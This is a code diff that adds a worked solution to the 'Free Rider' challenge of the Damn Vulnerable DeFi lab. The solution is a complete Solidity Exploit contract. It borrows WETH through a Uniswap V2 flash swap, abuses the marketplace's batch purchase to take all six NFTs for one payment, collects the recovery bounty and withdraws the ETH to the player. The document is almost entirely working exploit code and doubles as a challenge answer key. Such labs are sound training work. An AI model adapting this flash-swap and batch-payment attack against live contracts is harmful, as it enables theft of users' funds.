@@ -11,6 +11,93 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
+contract Exploit is IERC721Receiver {
+    WETH weth;
+    IUniswapV2Pair uniswapPair;
+    FreeRiderNFTMarketplace marketplace;
+    DamnValuableNFT nft;
+    FreeRiderRecoveryManager recoveryManager;
+    address player;
+    uint256 constant NFT_PRICE = 15 ether;
+    uint256 constant AMOUNT_OF_NFTS = 6;
+
+    constructor(
+        WETH _weth, 
+        IUniswapV2Pair _uniswapPair, 
+        FreeRiderNFTMarketplace _marketplace, 
+        DamnValuableNFT _nft, 
+        FreeRiderRecoveryManager _recoveryManager,
+        address _player
+    ) 
+    {
+        weth = _weth;
+        uniswapPair = _uniswapPair;
+        marketplace = _marketplace;
+        nft = _nft;
+        recoveryManager = _recoveryManager;
+        player = _player;
+    }
+
+    function initiateFlashSwap() external {
+        // Determine which token is WETH (token0 or token1)
+        address token0 = uniswapPair.token0();
+        address token1 = uniswapPair.token1();
+
+        require(token0 == address(weth) || token1 == address(weth), "No WETH in pair");
+
+        (uint amount0Out, uint amount1Out) = token0 == address(weth)
+            ? (NFT_PRICE, uint(0))
+            : (uint(0), NFT_PRICE);
+
+        // Initiate the swap — this will call uniswapV2Call
+        uniswapPair.swap(
+            amount0Out,
+            amount1Out,
+            address(this),
+            abi.encode(NFT_PRICE) // data field passed in to make it a flash swap instead of a normal swap
+        );
+    }
+
+    function uniswapV2Call(address sender, uint, uint, bytes calldata) external {
+        // some added checks for security & learning ~
+        require(msg.sender == address(uniswapPair), "Unauthorized"); 
+        require(sender == address(this), "Invalid sender");
+        uint fee = (NFT_PRICE * 3) / 997 + 1; // 0.3% fee
+        uint amountToRepay = NFT_PRICE + fee;
+
+        weth.withdraw(NFT_PRICE);
+        attackMarket();
+        weth.deposit{value: amountToRepay}();
+        weth.transfer(address(uniswapPair), amountToRepay);
+    }
+
+    function withdraw() external {
+        payable(player).transfer(address(this).balance);
+    }
+
+
+    function attackMarket() internal {
+        uint256[] memory tokenIds = new uint256[](AMOUNT_OF_NFTS);
+        for(uint i=0; i<AMOUNT_OF_NFTS; ++i) {
+            tokenIds[i] = i;
+        }
+        marketplace.buyMany{value: NFT_PRICE}(tokenIds);
+        for (uint i = 0; i < AMOUNT_OF_NFTS; i++) {
+            nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(address(this)));
+        }
+    }
+
+    function onERC721Received(address, address, uint256 _tokenId, bytes calldata)
+        external
+        returns (bytes4)
+    {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+}
 
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -123,7 +210,9 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        Exploit exploitContract = new Exploit(weth, uniswapPair, marketplace, nft, recoveryManager, player);
+        exploitContract.initiateFlashSwap();
+        exploitContract.withdraw();
     }
 
     /**
